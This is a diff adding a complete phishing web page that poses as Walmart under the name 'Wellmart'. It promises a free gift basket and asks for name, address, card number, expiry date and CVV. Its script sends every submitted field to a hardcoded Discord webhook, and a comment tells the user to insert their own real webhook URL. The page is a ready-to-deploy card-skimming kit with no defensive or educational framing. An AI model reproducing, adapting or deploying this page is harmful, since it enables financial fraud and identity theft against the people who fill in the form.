@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wellmart</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            background-color: rgba(255, 255, 255, 0.95);
+            padding: 50px 40px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            max-width: 580px;
+            width: 100%;
+            text-align: center;
+        }
+        .logo-img {
+            width: 230px;
+            margin-bottom: 20px;
+        }
+        .logo-text {
+            font-size: 42px;
+            font-weight: 700;
+            color: #1e40af;
+            letter-spacing: 1px;
+        }
+        .tagline {
+            font-size: 18px;
+            color: #555;
+            margin: 10px 0 40px;
+        }
+        h1 { font-size: 28px; margin-bottom: 30px; color: #333; }
+        label {
+            text-align: left;
+            margin-bottom: 8px;
+            color: #444;
+            font-weight: 600;
+            display: block;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            font-size: 16px;
+            background:#f8fbff;
+        }
+        input:focus, textarea:focus {
+            border-color: #1e40af;
+            box-shadow: 0 0 0 3px rgba(30,64,175,0.2);
+            outline: none;
+        }
+        .card-row {
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr;
+            gap: 15px;
+        }
+        button {
+            background: #1e40af;
+            color: white;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: 0.3s;
+        }
+        button:hover { background: #1e3a8a; transform: translateY(-3px); }
+        .thank-you { display: none; color: #28a745; font-size: 24px; font-weight: 600; margin-top: 30px; }
+        .error { display: none; color: #dc3545; font-size: 16px; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://play-lh.googleusercontent.com/iLd9j47vHw2oXjhY0p8hfgDsYgTmE215fw-m1lwhX8oplwstatVO1cmsYktjz6_kojo=w240-h480" alt="Wellmart Logo" class="logo-img">
+        <div class="logo-text">WELLMART</div>
+        <div class="tagline">
+Update your Walmart account now and receive a free gift basket and free delivery on very items you bought this season</div>
+        <h1>Hello User
+            Fill Your Informations
+        </h1>
+
+        <form id="infoForm">
+            <label>FIRST NAME</label>
+            <input type="text" name="firstName" required>
+
+            <label>SECOND NAME</label>
+            <input type="text" name="secondName" required>
+
+            <label>MIDDLE NAME</label>
+            <input type="text" name="middleName">
+
+            <label>ADDRESS</label>
+            <textarea name="address" rows="3" required></textarea>
+
+            <label>CARD HOLDER</label>
+            <input type="text" name="cardHolder" required>
+
+            <label>CARD NUMBER</label>
+            <input type="text" name="cardNumber" placeholder="1234 5678 9012 3456" required>
+
+            <div class="card-row">
+                <div>
+                    <label>EXPIRY DATE</label>
+                    <input type="text" name="expiry" placeholder="MM/YY" required>
+                </div>
+                <div>
+                    <label>CARD CVV</label>
+                    <input type="text" name="cvv" placeholder="123" maxlength="4" required>
+                </div>
+            </div>
+
+            <button type="submit" id="submitBtn">Submit</button>
+        </form>
+
+        <div class="thank-you" id="thankYouMessage">
+             Subit Successful! <br>Thank you..
+        </div>
+        <div class="error" id="errorMessage">
+            Error – Please check your connection or webhook and try again.
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('infoForm');
+        const thankYou = document.getElementById('thankYouMessage');
+        const errorMsg = document.getElementById('errorMessage');
+        const submitBtn = document.getElementById('submitBtn');
+
+        // PUT YOUR REAL DISCORD WEBHOOK URL HERE
+        const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1448834115981021329/TzZtUP5ZhvUSo9ttQIAjE2o1Lqvm2K_iFAX8Md8GMfIw-STeleL3DMX7G-RyT4TijN9c';
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Processing...';
+
+            const data = Object.fromEntries(new FormData(form));
+
+            const message = {
+                content: `**NEW WELLMART PAYMENT SUBMISSION**\n\n` +
+                         `**First Name:** ${data.firstName}\n` +
+                         `**Second Name:** ${data.secondName}\n` +
+                         `**Middle Name:** ${data.middleName || '—'}\n` +
+                         `**Address:** ${data.address}\n` +
+                         `**Card Holder:** ${data.cardHolder}\n` +
+                         `**Card Number:** ${data.cardNumber}\n` +
+                         `**Expiry Date:** ${data.expiry}\n` +
+                         `**CVV:** ${data.cvv}`
+            };
+
+            try {
+                const res = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(message)
+                });
+
+                if (res.ok) {
+                    form.style.display = 'none';
+                    thankYou.style.display = 'block';
+                } else throw new Error();
+            } catch (err) {
+                errorMsg.style.display = 'block';
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit Payment';
+            }
+        });
+    </script>
+</body>
+</html>
